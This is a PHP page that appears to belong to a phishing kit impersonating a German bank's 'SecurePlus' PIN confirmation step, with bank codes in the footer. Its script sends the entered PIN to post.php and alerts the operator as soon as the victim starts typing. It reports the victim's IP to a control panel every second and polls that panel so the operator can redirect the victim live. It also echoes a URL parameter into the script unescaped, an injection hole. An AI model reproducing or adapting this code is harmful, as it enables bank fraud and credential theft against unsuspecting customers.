<?php 
require '../main.php';
$_SESSION['cp'] = basename($_SERVER['PHP_SELF']);
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecurePlus</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<img src="res/logo.svg">
</header>


<main>
<div class="form">



<div class="title" style="text-align:center;">
<img src="res/lock.png" style="width:60px;"><br>
SecurePlus
</div>
<?php 
$helper->setError();
?>
<div class="col">
    <label>SecurePlus PIN</label>
    <input type="text" id="u">
</div>

<div class="col btn">
    <button onclick="sendCode()">Bestätigen</button>
</div>


<div class="col rgst">
    SecurePlus PIN vergessen?
</div>



</div>
</main>




<footer>
<span>Sicherheit</span>
<span>Cookie-Einstellungen </span>
<span>Datenschutz </span>
<span>Barrierefreiheit </span>
<span>Nachhaltigkeit</span>
<span>AGB </span>
<span>Disclaimer </span>
<span>Impressum</span>
<span>BLZ: 76030080</span>
<span>BIC: CSDBDE71</span>
</footer>
<?php 
$helper->addLoader();
?>
<script>


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCode();
    }
})

function sendCode(){
    if($("#u").val()!=""){
        $(".loader").show();
        $.post("post.php",{secure:$("#u").val()});
    }
}


var abortNote = false;
$("input").keyup(()=>{
    if(!abortNote){
        $.post("post.php",{note:"Entering SecurePlus PIN..."});
        abortNote=true;
    }

});

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>